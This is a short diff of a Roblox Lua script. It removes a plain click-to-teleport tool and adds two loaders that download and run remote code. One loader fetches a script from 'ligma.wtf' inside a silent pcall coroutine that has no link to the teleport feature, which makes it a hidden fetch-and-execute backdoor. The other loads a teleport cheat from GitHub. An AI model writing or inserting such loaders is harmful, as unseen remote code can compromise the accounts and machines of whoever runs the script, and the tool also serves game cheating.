@@ -1,10 +1,4 @@
-mouse = game.Players.LocalPlayer:GetMouse()
-tool = Instance.new("Tool")
-tool.RequiresHandle = false
-tool.Name = "Click Tp"
-tool.Activated:connect(function()
-local pos = mouse.Hit+Vector3.new(0,2.5,0)
-pos = CFrame.new(pos.X,pos.Y,pos.Z)
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
 end)
-tool.Parent = game.Players.LocalPlayer.Backpack
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/RBLXScript/main/TPTools.lua", true))(...)
